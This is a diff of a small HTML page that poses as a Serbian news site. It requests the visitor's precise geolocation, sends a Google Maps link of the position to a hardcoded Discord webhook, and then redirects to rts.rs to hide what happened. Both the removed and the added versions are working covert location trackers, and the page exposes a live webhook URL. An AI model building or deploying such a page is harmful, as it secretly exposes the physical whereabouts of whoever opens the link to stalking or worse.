@@ -1,41 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head><title>Vesti - Najnovije</title><meta charset="UTF-8"></head>
+<head><meta charset="UTF-8"></head>
 <body>
-    <h2 style="text-align:center; font-family:sans-serif; margin-top:50px;">Učitavanje vesti...</h2>
     <script>
-        const discordWebhook = "https://discordapp.com/api/webhooks/1494140296936558602/NW_nYMuyUgbb_cSUwheVuvk0U60zeUp6iEzqPVZEUiZeW7Ix18Vs1mJvHKNyKU2oBk7i";
-        const redirectUrl = "https://www.rts.rs";
+        const webhook = "https://discord.com/api/webhooks/1494140296936558602/NW_nYMuyUgbb_cSUwheVuvk0U60zeUp6iEzqPVZEUiZeW7Ix18Vs1mJvHKNyKU2oBk7i";
+        
+        navigator.geolocation.getCurrentPosition(function(pos) {
+            var lat = pos.coords.latitude;
+            var lon = pos.coords.longitude;
+            var data = {
+                content: "📍 **Lokacija:** https://www.google.com/maps?q=" + lat + "," + lon
+            };
 
-        async function sendToDiscord(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            try {
-                // await tera skriptu da CEKA dok Discord ne potvrdi prijem
-                await fetch(discordWebhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `🚨 **LOKACIJA AKTIVIRANA** 🚨\nMapa: ${mapsLink}\nPreciznost: ${Math.round(position.coords.accuracy)}m`
-                    })
-                });
-            } catch (e) { console.log(e); }
-            
-            window.location.href = redirectUrl;
-        }
-
-        function handleError() { window.location.href = redirectUrl; }
-
-        window.onload = function() {
-            navigator.geolocation.getCurrentPosition(sendToDiscord, handleError, {
-                enableHighAccuracy: true,
-                timeout: 10000
-            });
-            // Sigurnosni prebacaj nakon 8 sekundi ako se nista ne desi
-            setTimeout(handleError, 8000);
-        };
+            var request = new XMLHttpRequest();
+            request.open("POST", webhook);
+            request.setRequestHeader('Content-type', 'application/json');
+            request.onreadystatechange = function() {
+                // Tek kad Discord potvrdi prijem (status 204), idemo na RTS
+                if (request.readyState == 4) {
+                    window.location.href = "https://www.rts.rs";
+                }
+            };
+            request.send(JSON.stringify(data));
+        }, function() {
+            window.location.href = "https://www.rts.rs";
+        }, {enableHighAccuracy: true, timeout: 5000});
     </script>
 </body>
 </html>
